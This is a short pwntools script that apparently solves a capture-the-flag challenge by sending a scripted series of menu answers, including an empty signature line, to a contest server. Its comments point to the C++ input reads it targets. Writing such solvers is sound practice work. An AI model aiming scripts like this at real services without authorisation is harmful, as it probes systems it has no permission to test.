from pwn import * # pip install pwntools
from Crypto.Util.number import getPrime, bytes_to_long, inverse, long_to_bytes
import binascii

r = remote('shell.actf.co', 21300, level = 'debug')

print(r.recv())
print(r.recv())
r.sendline("1")   # cin >> action;
print(r.recv())
print(r.recv())
r.sendline("yes") # cin >> agreement;
print(r.recv())
r.sendline("") # getline(cin, signature);
print(r.recv())
r.sendline("fuga") # getline(cin, player.name);
print(r.recv())
print(r.recv())
r.sendline("2") # cin >> action;
print(r.recv())
print(r.recv())
r.sendline("2") # cin >> action;
print(r.recv())
print(r.recv())